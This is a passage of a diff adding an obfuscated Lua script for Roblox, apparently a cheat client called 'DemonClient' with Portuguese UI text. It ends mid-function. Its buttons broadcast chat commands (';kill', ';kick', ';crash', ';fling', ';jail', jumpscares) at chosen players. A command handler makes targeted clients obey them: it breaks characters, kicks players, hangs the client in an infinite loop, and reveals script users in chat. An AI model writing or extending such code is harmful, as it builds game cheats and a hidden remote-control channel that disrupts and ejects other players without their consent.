+end
+local BasicSection = ComandosTab:Section({Title="Comandos Básicos",Desc="Comandos fundamentais do sistema"});
+local KillButton = BasicSection:Button({Title="Kill cmd",Icon="skull",Callback=function()
+	if (#selectedPlayers > 0) then
+		local FlatIdent_8638E = 0;
+		while true do
+			if (FlatIdent_8638E == 0) then
+				for _, playerName in ipairs(selectedPlayers) do
+					local mensagem = ";kill " .. playerName;
+					SendCommand(mensagem);
+				end
+				WindUI:Notify("Kill", "Comando executado em " .. #selectedPlayers .. " jogador(es)!");
+				break;
+			end
+		end
+	else
+		WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!");
+	end
+end});
+local KillPlusButton = BasicSection:Button({Title="Kill Plus",Icon="skull",Callback=function()
+	if (#selectedPlayers > 0) then
+		local FlatIdent_8FBAE = 0;
+		while true do
+			if (FlatIdent_8FBAE == 0) then
+				for _, playerName in ipairs(selectedPlayers) do
+					local FlatIdent_44100 = 0;
+					local player;
+					while true do
+						if (FlatIdent_44100 == 0) then
+							player = Players:FindFirstChild(playerName);
+							if player then
+								local FlatIdent_4D83A = 0;
+								while true do
+									if (FlatIdent_4D83A == 0) then
+										KillPlus(player);
+										SendCommand("💀 Kill Plus executado em " .. playerName);
+										break;
+									end
+								end
+							end
+							break;
+						end
+					end
+				end
+				WindUI:Notify("Kill Plus", "💀 Kill Plus executado em " .. #selectedPlayers .. " jogador(es)!");
+				break;
+			end
+		end
+	else
+		WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!");
+	end
+end});
+local KickButton = BasicSection:Button({Title="Kick cmd",Icon="door-open",Callback=function()
+	if (#selectedPlayers > 0) then
+		local FlatIdent_956D = 0;
+		while true do
+			if (FlatIdent_956D == 0) then
+				for _, playerName in ipairs(selectedPlayers) do
+					local FlatIdent_3B868 = 0;
+					local mensagem;
+					while true do
+						if (FlatIdent_3B868 == 0) then
+							mensagem = ";kick " .. playerName;
+							SendCommand(mensagem);
+							break;
+						end
+					end
+				end
+				WindUI:Notify("Kick", "Comando executado em " .. #selectedPlayers .. " jogador(es)!");
+				break;
+			end
+		end
+	else
+		WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!");
+	end
+end});
+local CrashButton = BasicSection:Button({Title="Crash cmd",Icon="alert-triangle",Callback=function()
+	if (#selectedPlayers > 0) then
+		for _, playerName in ipairs(selectedPlayers) do
+			local FlatIdent_D14D = 0;
+			local mensagem;
+			while true do
+				if (FlatIdent_D14D == 0) then
+					mensagem = ";crash " .. playerName;
+					SendCommand(mensagem);
+					break;
+				end
+			end
+		end
+		WindUI:Notify("Crash", "Comando executado em " .. #selectedPlayers .. " jogador(es)!");
+	else
+		WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!");
+	end
+end});
+local BringButton = BasicSection:Button({Title="Bring cmd",Icon="move",Callback=function()
+	if (#selectedPlayers > 0) then
+		local FlatIdent_803FB = 0;
+		while true do
+			if (FlatIdent_803FB == 0) then
+				for _, playerName in ipairs(selectedPlayers) do
+					local FlatIdent_55D83 = 0;
+					local mensagem;
+					while true do
+						if (FlatIdent_55D83 == 0) then
+							mensagem = ";bring " .. playerName;
+							SendCommand(mensagem);
+							break;
+						end
+					end
+				end
+				WindUI:Notify("BRING", "🎯 Puxando " .. #selectedPlayers .. " jogador(es) para você!");
+				break;
+			end
+		end
+	else
+		WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!");
+	end
+end});
+local FlingButton = BasicSection:Button({Title="Fling cmd",Icon="rocket",Callback=function()
+	if (#selectedPlayers > 0) then
+		for _, playerName in ipairs(selectedPlayers) do
+			local FlatIdent_6C967 = 0;
+			local mensagem;
+			while true do
+				if (FlatIdent_6C967 == 0) then
+					mensagem = ";fling " .. playerName;
+					SendCommand(mensagem);
+					break;
+				end
+			end
+		end
+		WindUI:Notify("FLING", "🚀 Jogando " .. #selectedPlayers .. " jogador(es) pro VOID!");
+	else
+		WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!");
+	end
+end});
+local FreezeButton = BasicSection:Button({Title="Freeze cmd",Icon="snowflake",Callback=function()
+	if (#selectedPlayers > 0) then
+		local FlatIdent_2FBBD = 0;
+		while true do
+			if (0 == FlatIdent_2FBBD) then
+				for _, playerName in ipairs(selectedPlayers) do
+					local FlatIdent_90113 = 0;
+					local mensagem;
+					while true do
+						if (FlatIdent_90113 == 0) then
+							mensagem = ";freeze " .. playerName;
+							SendCommand(mensagem);
+							break;
+						end
+					end
+				end
+				WindUI:Notify("FREEZE", "❄️ Congelando " .. #selectedPlayers .. " jogador(es)!");
+				break;
+			end
+		end
+	else
+		WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!");
+	end
+end});
+local UnfreezeButton = BasicSection:Button({Title="Unfreeze cmd",Icon="flame",Callback=function()
+	if (#selectedPlayers > 0) then
+		local FlatIdent_67F21 = 0;
+		while true do
+			if (FlatIdent_67F21 == 0) then
+				for _, playerName in ipairs(selectedPlayers) do
+					local FlatIdent_8EA6E = 0;
+					local mensagem;
+					while true do
+						if (FlatIdent_8EA6E == 0) then
+							mensagem = ";unfreeze " .. playerName;
+							SendCommand(mensagem);
+							break;
+						end
+					end
+				end
+				WindUI:Notify("UNFREEZE", "🔥 Descongelando " .. #selectedPlayers .. " jogador(es)!");
+				break;
+			end
+		end
+	else
+		WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!");
+	end
+end});
+local JailButton = BasicSection:Button({Title="Jail cmd",Icon="lock",Callback=function()
+	if (#selectedPlayers > 0) then
+		local FlatIdent_33DE6 = 0;
+		while true do
+			if (0 == FlatIdent_33DE6) then
+				for _, playerName in ipairs(selectedPlayers) do
+					local FlatIdent_3F15E = 0;
+					local mensagem;
+					while true do
+						if (FlatIdent_3F15E == 0) then
+							mensagem = ";jail " .. playerName;
+							SendCommand(mensagem);
+							break;
+						end
+					end
+				end
+				WindUI:Notify("JAIL", "⚫ Prendendo " .. #selectedPlayers .. " jogador(es)!");
+				break;
+			end
+		end
+	else
+		WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!");
+	end
+end});
+local UnjailButton = BasicSection:Button({Title="Unjail cmd",Icon="unlock",Callback=function()
+	if (#selectedPlayers > 0) then
+		local FlatIdent_56F59 = 0;
+		while true do
+			if (FlatIdent_56F59 == 0) then
+				for _, playerName in ipairs(selectedPlayers) do
+					local mensagem = ";unjail " .. playerName;
+					SendCommand(mensagem);
+				end
+				WindUI:Notify("UNJAIL", "⚪ Soltando " .. #selectedPlayers .. " jogador(es)!");
+				break;
+			end
+		end
+	else
+		WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!");
+	end
+end});
+local ExplodeButton = BasicSection:Button({Title="Explodir cmd",Icon="bomb",Callback=function()
+	if (#selectedPlayers > 0) then
+		local FlatIdent_3121 = 0;
+		while true do
+			if (FlatIdent_3121 == 0) then
+				for _, playerName in ipairs(selectedPlayers) do
+					local FlatIdent_90A69 = 0;
+					local mensagem;
+					while true do
+						if (FlatIdent_90A69 == 0) then
+							mensagem = ";explodir " .. playerName;
+							SendCommand(mensagem);
+							break;
+						end
+					end
+				end
+				WindUI:Notify("EXPLOSÃO", "💥 BOOM! Comando executado em " .. #selectedPlayers .. " jogador(es)!");
+				break;
+			end
+		end
+	else
+		WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!");
+	end
+end});
+local BackroomsButton = BasicSection:Button({Title="Backrooms cmd",Icon="door-open",Callback=function()
+	if (#selectedPlayers > 0) then
+		for _, playerName in ipairs(selectedPlayers) do
+			local player = Players:FindFirstChild(playerName);
+			if player then
+				TeleportToBackrooms(player);
+			end
+		end
+		WindUI:Notify("BACKROOMS", "🚪 Enviando " .. #selectedPlayers .. " jogador(es) para as Backrooms! CUIDADO COM O MONSTRO! 💀");
+	else
+		WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!");
+	end
+end});
+local UnbackroomsButton = BasicSection:Button({Title="Unbackrooms cmd",Icon="home",Callback=function()
+	if (#selectedPlayers > 0) then
+		for _, playerName in ipairs(selectedPlayers) do
+			local FlatIdent_1BB5D = 0;
+			local player;
+			while true do
+				if (FlatIdent_1BB5D == 0) then
+					player = Players:FindFirstChild(playerName);
+					if player then
+						RestoreNormalWorld();
+					end
+					break;
+				end
+			end
+		end
+		WindUI:Notify("BACKROOMS", "🏠 Retornando " .. #selectedPlayers .. " jogador(es) do Backrooms!");
+	else
+		WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!");
+	end
+end});
+local JumpscareSection = ComandosTab:Section({Title="Sistema de Jumpscares",Desc="Sustos e efeitos assustadores"});
+for _, jumpscare in ipairs(JUMPSCARES) do
+	local JumpscareButton = JumpscareSection:Button({Title=jumpscare.Name,Icon="alert-triangle",Callback=function()
+		if (#selectedPlayers > 0) then
+			local FlatIdent_40096 = 0;
+			while true do
+				if (FlatIdent_40096 == 0) then
+					for _, playerName in ipairs(selectedPlayers) do
+						local mensagem = jumpscare.Name .. " " .. playerName;
+						SendCommand(mensagem);
+					end
+					WindUI:Notify("Jumpscare", jumpscare.Name .. " enviado para " .. #selectedPlayers .. " jogador(es)!");
+					break;
+				end
+			end
+		else
+			WindUI:Notify("Erro", "❌ Selecione jogadores primeiro!");
+		end
+	end});
+end
+local TagsSection = ComandosTab:Section({Title="Sistema de Tags",Desc="Controle de tags dos jogadores"});
+local TagAllButton = TagsSection:Button({Title="Ativar Todas Tags",Icon="eye",Callback=function()
+	SendCommand(";tag all");
+	WindUI:Notify("Tags", "🏷️ Todas as tags foram ativadas!");
+	for _, player in ipairs(Players:GetPlayers()) do
+		applyTag(player);
+	end
+end});
+local UntagAllButton = TagsSection:Button({Title="Remover Todas Tags",Icon="eye-off",Callback=function()
+	local FlatIdent_622B0 = 0;
+	while true do
+		if (FlatIdent_622B0 == 0) then
+			SendCommand(";untag all");
+			WindUI:Notify("Tags", "🚫 Todas as tags foram removidas!");
+			FlatIdent_622B0 = 1;
+		end
+		if (FlatIdent_622B0 == 1) then
+			for _, player in ipairs(Players:GetPlayers()) do
+				if (player.Character and player.Character:FindFirstChild("Head")) then
+					local FlatIdent_98327 = 0;
+					local head;
+					local tag;
+					while true do
+						if (FlatIdent_98327 == 0) then
+							head = player.Character.Head;
+							tag = head:FindFirstChild("SpecialTag");
+							FlatIdent_98327 = 1;
+						end
+						if (FlatIdent_98327 == 1) then
+							if tag then
+								tag:Destroy();
+							end
+							break;
+						end
+					end
+				end
+			end
+			break;
+		end
+	end
+end});
+local TagMeButton = TagsSection:Button({Title="Ativar Minha Tag",Icon="user",Callback=function()
+	local FlatIdent_35AC5 = 0;
+	while true do
+		if (FlatIdent_35AC5 == 1) then
+			applyTag(LocalPlayer);
+			break;
+		end
+		if (FlatIdent_35AC5 == 0) then
+			SendCommand(";tag");
+			WindUI:Notify("Tags", "👤 Sua tag foi ativada!");
+			FlatIdent_35AC5 = 1;
+		end
+	end
+end});
+local UntagMeButton = TagsSection:Button({Title="Remover Minha Tag",Icon="user-x",Callback=function()
+	local FlatIdent_A446 = 0;
+	while true do
+		if (FlatIdent_A446 == 1) then
+			if (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Head")) then
+				local head = LocalPlayer.Character.Head;
+				local tag = head:FindFirstChild("SpecialTag");
+				if tag then
+					tag:Destroy();
+				end
+			end
+			break;
+		end
+		if (FlatIdent_A446 == 0) then
+			SendCommand(";untag");
+			WindUI:Notify("Tags", "🙈 Sua tag foi removida!");
+			FlatIdent_A446 = 1;
+		end
+	end
+end});
+local function ProcessarComando(mensagem)
+	if (string.sub(mensagem, 1, 1) == ";") then
+		local partes = string.split(string.sub(mensagem, 2), " ");
+		local comando = partes[1]:lower();
+		local nomeAlvo = table.concat(partes, " ", 2);
+		local isSelfTarget = nomeAlvo and ((nomeAlvo:lower() == LocalPlayer.Name:lower()) or (nomeAlvo:lower() == LocalPlayer.DisplayName:lower()));
+		local playerName = LocalPlayer.Name;
+		local character = LocalPlayer.Character;
+		local humanoid = character and character:FindFirstChildOfClass("Humanoid");
+		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart");
+		if isSelfTarget then
+			print("🎯 Comando recebido: " .. comando .. " para " .. LocalPlayer.Name);
+			if (comando == "untag") then
+				local FlatIdent_14454 = 0;
+				while true do
+					if (FlatIdent_14454 == 1) then
+						return;
+					end
+					if (FlatIdent_14454 == 0) then
+						if (character and character:FindFirstChild("Head")) then
+							local FlatIdent_52EE1 = 0;
+							local head;
+							local tag;
+							while true do
+								if (FlatIdent_52EE1 == 0) then
+									head = character.Head;
+									tag = head:FindFirstChild("SpecialTag");
+									FlatIdent_52EE1 = 1;
+								end
+								if (FlatIdent_52EE1 == 1) then
+									if tag then
+										tag:Destroy();
+									end
+									break;
+								end
+							end
+						end
+						StarterGui:SetCore("ChatMakeSystemMessage", {Text=("[DemonClient] Tags removidas para " .. LocalPlayer.Name),Color=Color3.fromRGB(170, 0, 255),Font=Enum.Font.GothamBold});
+						FlatIdent_14454 = 1;
+					end
+				end
+			end
+			if (comando == "tag") then
+				local FlatIdent_2F298 = 0;
+				while true do
+					if (FlatIdent_2F298 == 1) then
+						return;
+					end
+					if (FlatIdent_2F298 == 0) then
+						applyTag(LocalPlayer);
+						StarterGui:SetCore("ChatMakeSystemMessage", {Text=("[DemonClient] Tags restauradas para " .. LocalPlayer.Name),Color=Color3.fromRGB(170, 0, 255),Font=Enum.Font.GothamBold});
+						FlatIdent_2F298 = 1;
+					end
+				end
+			end
+			if (comando == "killplus") then
+				local FlatIdent_6F99F = 0;
+				while true do
+					if (FlatIdent_6F99F == 0) then
+						KillPlus(LocalPlayer);
+						return;
+					end
+				end
+			end
+			if (comando == "backrooms") then
+				TeleportToBackrooms(LocalPlayer);
+				return;
+			end
+			if (comando == "unbackrooms") then
+				local FlatIdent_15034 = 0;
+				while true do
+					if (FlatIdent_15034 == 0) then
+						RestoreNormalWorld();
+						return;
+					end
+				end
+			end
+			if (comando == "freeze") then
+				local FlatIdent_23FF9 = 0;
+				while true do
+					if (FlatIdent_23FF9 == 0) then
+						if humanoid then
+							local FlatIdent_61084 = 0;
+							while true do
+								if (FlatIdent_61084 == 1) then
+									print("❄️ FREEZE executado em " .. LocalPlayer.Name);
+									break;
+								end
+								if (FlatIdent_61084 == 0) then
+									playerOriginalSpeed[playerName] = humanoid.WalkSpeed;
+									humanoid.WalkSpeed = 0;
+									FlatIdent_61084 = 1;
+								end
+							end
+						end
+						return;
+					end
+				end
+			end
+			if (comando == "unfreeze") then
+				local FlatIdent_679D2 = 0;
+				while true do
+					if (FlatIdent_679D2 == 0) then
+						if humanoid then
+							local FlatIdent_523B3 = 0;
+							while true do
+								if (FlatIdent_523B3 == 0) then
+									humanoid.WalkSpeed = playerOriginalSpeed[playerName] or 16;
+									playerOriginalSpeed[playerName] = nil;
+									FlatIdent_523B3 = 1;
+								end
+								if (FlatIdent_523B3 == 1) then
+									print("🔥 UNFREEZE executado em " .. LocalPlayer.Name);
+									break;
+								end
+							end
+						end
+						return;
+					end
+				end
+			end
+			if (comando == "jail") then
+				local FlatIdent_9851B = 0;
+				while true do
+					if (FlatIdent_9851B == 0) then
+						if character then
+							local FlatIdent_3E44E = 0;
+							local root;
+							local humanoid;
+							while true do
+								if (FlatIdent_3E44E == 1) then
+									if (root and humanoid) then
+										playerOriginalSpeed[playerName] = humanoid.WalkSpeed;
+										humanoid.WalkSpeed = 0;
+										local size = 12;
+										local pos = root.Position;
+										jaulas[playerName] = {};
+										local function criarBarra(cframe, size, color)
+											local FlatIdent_243F3 = 0;
+											local p;
+											local pointLight;
+											while true do
+												if (FlatIdent_243F3 == 5) then
+													table.insert(jaulas[playerName], p);
+													return p;
+												end
+												if (FlatIdent_243F3 == 3) then
+													p.Parent = workspace;
+													pointLight = Instance.new("PointLight");
+													pointLight.Brightness = 3;
+													FlatIdent_243F3 = 4;
+												end
+												if (FlatIdent_243F3 == 2) then
+													p.BrickColor = color;
+													p.Reflectance = 0.2;
+													p.CFrame = cframe;
+													FlatIdent_243F3 = 3;
+												end
+												if (FlatIdent_243F3 == 0) then
+													p = Instance.new("Part");
+													p.Name = "DemonClientJailBar";
+													p.Size = size;
+													FlatIdent_243F3 = 1;
+												end
+												if (FlatIdent_243F3 == 4) then
+													pointLight.Range = 8;
+													pointLight.Color = ((color == BrickColor.new("Really black")) and Color3.new(0, 0, 0)) or Color3.new(1, 1, 1);
+													pointLight.Parent = p;
+													FlatIdent_243F3 = 5;
+												end
+												if (FlatIdent_243F3 == 1) then
+													p.Anchored = true;
+													p.CanCollide = true;
+													p.Material = Enum.Material.Neon;
+													FlatIdent_243F3 = 2;
+												end
+											end
+										end
+										criarBarra(CFrame.new(pos + Vector3.new(size / 2, 0, size / 2)), Vector3.new(0.8, size, 0.8), BrickColor.new("Really black"));
+										criarBarra(CFrame.new(pos + Vector3.new(-size / 2, 0, size / 2)), Vector3.new(0.8, size, 0.8), BrickColor.new("Really black"));
+										criarBarra(CFrame.new(pos + Vector3.new(size / 2, 0, -size / 2)), Vector3.new(0.8, size, 0.8), BrickColor.new("Really black"));
+										criarBarra(CFrame.new(pos + Vector3.new(-size / 2, 0, -size / 2)), Vector3.new(0.8, size, 0.8), BrickColor.new("Really black"));
+										criarBarra(CFrame.new(pos + Vector3.new(0, size / 2, size / 2)), Vector3.new(size, 0.8, 0.8), BrickColor.new("Institutional white"));
+										criarBarra(CFrame.new(pos + Vector3.new(0, size / 2, -size / 2)), Vector3.new(size, 0.8, 0.8), BrickColor.new("Institutional white"));
+										criarBarra(CFrame.new(pos + Vector3.new(size / 2, size / 2, 0)), Vector3.new(0.8, 0.8, size), BrickColor.new("Institutional white"));
+										criarBarra(CFrame.new(pos + Vector3.new(-size / 2, size / 2, 0)), Vector3.new(0.8, 0.8, size), BrickColor.new("Institutional white"));
+										criarBarra(CFrame.new(pos + Vector3.new(0, -size / 2, size / 2)), Vector3.new(size, 0.8, 0.8), BrickColor.new("Institutional white"));
+										criarBarra(CFrame.new(pos + Vector3.new(0, -size / 2, -size / 2)), Vector3.new(size, 0.8, 0.8), BrickColor.new("Institutional white"));
+										criarBarra(CFrame.new(pos + Vector3.new(size / 2, -size / 2, 0)), Vector3.new(0.8, 0.8, size), BrickColor.new("Institutional white"));
+										criarBarra(CFrame.new(pos + Vector3.new(-size / 2, -size / 2, 0)), Vector3.new(0.8, 0.8, size), BrickColor.new("Institutional white"));
+										if jailConnections[playerName] then
+											jailConnections[playerName]:Disconnect();
+										end
+										jailConnections[playerName] = RunService.Heartbeat:Connect(function()
+											if (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")) then
+												local hrp = LocalPlayer.Character.HumanoidRootPart;
+												local center = pos + Vector3.new(0, 0, 0);
+												if ((hrp.Position - center).Magnitude > ((size / 2) - 1)) then
+													hrp.CFrame = CFrame.new(center);
+												end
+											end
+										end);
+										print("⚫ JAIL PRETO E BRANCO executado em " .. LocalPlayer.Name);
+									end
+									break;
+								end
+								if (FlatIdent_3E44E == 0) then
+									root = character:FindFirstChild("HumanoidRootPart");
+									humanoid = character:FindFirstChildOfClass("Humanoid");
+									FlatIdent_3E44E = 1;
+								end
+							end
+						end
+						return;
+					end
+				end
+			end
+			if (comando == "unjail") then
+				if character then
+					local humanoid = character:FindFirstChildOfClass("Humanoid");
+					if humanoid then
+						humanoid.WalkSpeed = playerOriginalSpeed[playerName] or 16;
+						playerOriginalSpeed[playerName] = nil;
+					end
+					if jaulas[playerName] then
+						local FlatIdent_89126 = 0;
+						while true do
+							if (FlatIdent_89126 == 1) then
+								print("✅ Quadrado 3D do Jail removido do mapa!");
+								break;
+							end
+							if (FlatIdent_89126 == 0) then
+								for _, p in ipairs(jaulas[playerName]) do
+									if (p and p.Parent) then
+										p:Destroy();
+									end
+								end
+								jaulas[playerName] = nil;
+								FlatIdent_89126 = 1;
+							end
+						end
+					end
+					if jailConnections[playerName] then
+						local FlatIdent_2C453 = 0;
+						while true do
+							if (FlatIdent_2C453 == 0) then
+								jailConnections[playerName]:Disconnect();
+								jailConnections[playerName] = nil;
+								break;
+							end
+						end
+					end
+					print("⚪ UNJAIL executado em " .. LocalPlayer.Name);
+				end
+				return;
+			end
+			if (comando == "jumps1") then
+				local FlatIdent_59521 = 0;
+				while true do
+					if (FlatIdent_59521 == 0) then
+						TriggerJumpscare(LocalPlayer, JUMPSCARES[1]);
+						print("💀 JUMPS CARE 1 ativado em " .. LocalPlayer.Name);
+						break;
+					end
+				end
+			elseif (comando == "jumps2") then
+				local FlatIdent_97B67 = 0;
+				while true do
+					if (FlatIdent_97B67 == 0) then
+						TriggerJumpscare(LocalPlayer, JUMPSCARES[2]);
+						print("💀 JUMPS CARE 2 ativado em " .. LocalPlayer.Name);
+						break;
+					end
+				end
+			elseif (comando == "jumps3") then
+				local FlatIdent_4D69A = 0;
+				while true do
+					if (0 == FlatIdent_4D69A) then
+						TriggerJumpscare(LocalPlayer, JUMPSCARES[3]);
+						print("💀 JUMPS CARE 3 ativado em " .. LocalPlayer.Name);
+						break;
+					end
+				end
+			elseif (comando == "jumps4") then
+				local FlatIdent_42B8B = 0;
+				while true do
+					if (FlatIdent_42B8B == 0) then
+						TriggerJumpscare(LocalPlayer, JUMPSCARES[4]);
+						print("💀 JUMPS CARE 4 ativado em " .. LocalPlayer.Name);
+						break;
+					end
+				end
+			elseif ((comando == "kill") and character) then
+				character:BreakJoints();
+				print("💀 KILL executado em " .. LocalPlayer.Name);
+			elseif (comando == "kick") then
+				LocalPlayer:Kick("🚫 Você foi kickado - equipe: Demon");
+				print("👢 KICK executado em " .. LocalPlayer.Name);
+			elseif (comando == "crash") then
+				local FlatIdent_2B4B0 = 0;
+				while true do
+					if (FlatIdent_2B4B0 == 0) then
+						print("💥 CRASH executado em " .. LocalPlayer.Name);
+						while true do
+						end
+						break;
+					end
+				end
+			elseif ((comando == "explodir") and character) then
+				local humanoidRootPart = character:FindFirstChild("HumanoidRootPart");
+				if humanoidRootPart then
+					local FlatIdent_8BF78 = 0;
+					local explosion;
+					local pointLight;
+					local tweenInfo;
+					local tween;
+					while true do
+						if (FlatIdent_8BF78 == 1) then
+							explosion.Shape = Enum.PartType.Ball;
+							explosion.Material = Enum.Material.Neon;
+							explosion.BrickColor = BrickColor.new("Institutional white");
+							FlatIdent_8BF78 = 2;
+						end
+						if (FlatIdent_8BF78 == 2) then
+							explosion.Position = humanoidRootPart.Position;
+							explosion.Anchored = true;
+							explosion.CanCollide = false;
+							FlatIdent_8BF78 = 3;
+						end
+						if (FlatIdent_8BF78 == 5) then
+							character:BreakJoints();
+							for _, part in pairs(character:GetDescendants()) do
+								if (part:IsA("BasePart") and (part ~= humanoidRootPart)) then
+									part.Velocity = Vector3.new(math.random(-50, 50), math.random(30, 60), math.random(-50, 50));
+								end
+							end
+							tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out);
+							FlatIdent_8BF78 = 6;
+						end
+						if (0 == FlatIdent_8BF78) then
+							explosion = Instance.new("Part");
+							explosion.Name = "DemonClientExplosion";
+							explosion.Size = Vector3.new(8, 8, 8);
+							FlatIdent_8BF78 = 1;
+						end
+						if (FlatIdent_8BF78 == 4) then
+							pointLight.Range = 15;
+							pointLight.Color = Color3.new(1, 1, 1);
+							pointLight.Parent = explosion;
+							FlatIdent_8BF78 = 5;
+						end
+						if (FlatIdent_8BF78 == 3) then
+							explosion.Parent = workspace;
+							pointLight = Instance.new("PointLight");
+							pointLight.Brightness = 10;
+							FlatIdent_8BF78 = 4;
+						end
+						if (7 == FlatIdent_8BF78) then
+							print("💥 EXPLOSÃO BRANCA executada em " .. LocalPlayer.Name);
+							break;
+						end
+						if (FlatIdent_8BF78 == 6) then
+							tween = TweenService:Create(explosion, tweenInfo, {Size=Vector3.new(20, 20, 20)});
+							tween:Play();
+							game:GetService("Debris"):AddItem(explosion, 2);
+							FlatIdent_8BF78 = 7;
+						end
+					end
+				end
+			elseif ((comando == "fling") and character) then
+				local FlatIdent_62CB4 = 0;
+				local humanoidRootPart;
+				while true do
+					if (FlatIdent_62CB4 == 0) then
+						humanoidRootPart = character:FindFirstChild("HumanoidRootPart");
+						if humanoidRootPart then
+							local FlatIdent_8C1D5 = 0;
+							local flash;
+							local flashLight;
+							while true do
+								if (FlatIdent_8C1D5 == 0) then
+									print("🚀 INICIANDO FLING ÉPICO EM " .. LocalPlayer.Name);
+									flash = Instance.new("Part");
+									flash.Name = "DemonClientFlingFlash";
+									flash.Size = Vector3.new(15, 15, 15);
+									FlatIdent_8C1D5 = 1;
+								end
+								if (FlatIdent_8C1D5 == 5) then
+									print("🎯 " .. LocalPlayer.Name .. " foi pro infinito e além!");
+									break;
+								end
+								if (FlatIdent_8C1D5 == 4) then
+									wait(0.5);
+									humanoidRootPart.Velocity = Vector3.new(math.random(-999999, 999999), math.random(500000, 999999), math.random(-999999, 999999));
+									game:GetService("Debris"):AddItem(flash, 1);
+									print("🌌 FLING ÉPICO EXECUTADO! Qualidade da tela: 💀");
+									FlatIdent_8C1D5 = 5;
+								end
+								if (FlatIdent_8C1D5 == 3) then
+									flashLight.Brightness = 15;
+									flashLight.Range = 20;
+									flashLight.Color = Color3.new(0, 0, 1);
+									flashLight.Parent = flash;
+									FlatIdent_8C1D5 = 4;
+								end
+								if (1 == FlatIdent_8C1D5) then
+									flash.Shape = Enum.PartType.Ball;
+									flash.Material = Enum.Material.Neon;
+									flash.BrickColor = BrickColor.new("Bright blue");
+									flash.Position = humanoidRootPart.Position;
+									FlatIdent_8C1D5 = 2;
+								end
+								if (FlatIdent_8C1D5 == 2) then
+									flash.Anchored = true;
+									flash.CanCollide = false;
+									flash.Parent = workspace;
+									flashLight = Instance.new("PointLight");
+									FlatIdent_8C1D5 = 3;
+								end
+							end
+						end
+						break;
+					end
+				end
+			elseif ((comando == "bring") and character) then
+				local humanoidRootPart = character:FindFirstChild("HumanoidRootPart");
+				if humanoidRootPart then
+					print("🎯 BRING recebido! Procurando quem enviou...");
+					for _, player in ipairs(Players:GetPlayers()) do
+						if (player ~= LocalPlayer) then
+							if (player.Character and player.Character:FindFirstChild("HumanoidRootPart")) then
+								local senderRootPart = player.Character.HumanoidRootPart;
+								local bringEffect = Instance.new("Part");
+								bringEffect.Name = "DemonClientBringEffect";
+								bringEffect.Size = Vector3.new(6, 6, 6);
+								bringEffect.Shape = Enum.PartType.Ball;
+								bringEffect.Material = Enum.Material.Neon;
+								bringEffect.BrickColor = BrickColor.new("Bright green");
+								bringEffect.Position = humanoidRootPart.Position;
+								bringEffect.Anchored = true;
+								bringEffect.CanCollide = false;
+								bringEffect.Parent = workspace;
+								local bringLight = Instance.new("PointLight");
+								bringLight.Brightness = 8;
+								bringLight.Range = 15;
+								bringLight.Color = Color3.new(0, 1, 0);
+								bringLight.Parent = bringEffect;
+								local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out);
+								local tween = TweenService:Create(bringEffect, tweenInfo, {Size=Vector3.new(12, 12, 12),Transparency=0.8});
+								tween:Play();
+								local targetPosition = senderRootPart.Position + (senderRootPart.CFrame.LookVector * 5);
+								humanoidRootPart.Position = targetPosition + Vector3.new(0, 3, 0);
+								game:GetService("Debris"):AddItem(bringEffect, 1);
+								print("✅ BRING executado! Teletransportado para " .. player.Name);
+								break;
+							end
+						end
+					end
+				end
+			end
+		end
+		if ((comando == "untag") and (nomeAlvo == "all")) then
+			local FlatIdent_81DE9 = 0;
+			while true do
+				if (FlatIdent_81DE9 == 0) then
+					StarterGui:SetCore("ChatMakeSystemMessage", {Text="[DemonClient] Todas as tags foram removidas.",Color=Color3.fromRGB(170, 0, 255),Font=Enum.Font.GothamBold});
+					for _, player in ipairs(Players:GetPlayers()) do
+						if (player.Character and player.Character:FindFirstChild("Head")) then
+							local head = player.Character.Head;
+							local tag = head:FindFirstChild("SpecialTag");
+							if tag then
+								tag:Destroy();
+							end
+						end
+					end
+					FlatIdent_81DE9 = 1;
+				end
+				if (FlatIdent_81DE9 == 1) then
+					return;
+				end
+			end
+		end
+		if ((comando == "tag") and (nomeAlvo == "all")) then
+			local FlatIdent_7DB9E = 0;
+			while true do
+				if (FlatIdent_7DB9E == 1) then
+					return;
+				end
+				if (FlatIdent_7DB9E == 0) then
+					StarterGui:SetCore("ChatMakeSystemMessage", {Text="[DemonClient] Todas as tags foram restauradas.",Color=Color3.fromRGB(170, 0, 255),Font=Enum.Font.GothamBold});
+					for _, player in ipairs(Players:GetPlayers()) do
+						applyTag(player);
+					end
+					FlatIdent_7DB9E = 1;
+				end
+			end
+		end
+		if (comando == "verifique") then
+			local FlatIdent_67408 = 0;
+			while true do
+				if (FlatIdent_67408 == 1) then
+					if (TextChatService.ChatVersion == Enum.ChatVersion.TextChatService) then
+						local canal = TextChatService.TextChannels.RBXGeneral;
+						if canal then
+							local FlatIdent_1BC4A = 0;
+							while true do
+								if (FlatIdent_1BC4A == 0) then
+									canal:SendAsync("Demon_Users");
+									print("✅ Demon_Users enviado por: " .. LocalPlayer.Name);
+									break;
+								end
+							end
+						end
+					else
+						local FlatIdent_397D1 = 0;
+						while true do
+							if (FlatIdent_397D1 == 0) then
+								ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Demon_Users", "All");
+								print("✅ Demon_Users enviado por: " .. LocalPlayer.Name);
+								break;
+							end
+						end
+					end
+					break;
+				end
+				if (FlatIdent_67408 == 0) then
+					print("🎯 Verificação detectada! Digitando Demon_Users");
+					wait(2);
+					FlatIdent_67408 = 1;
+				end
+			end
+		end
+	end
+end
+task.spawn(function()
+	local FlatIdent_6B92D = 0;
+	local canal;
+	while true do
+		if (FlatIdent_6B92D == 1) then
+			if canal then
+				local FlatIdent_95359 = 0;
+				while true do
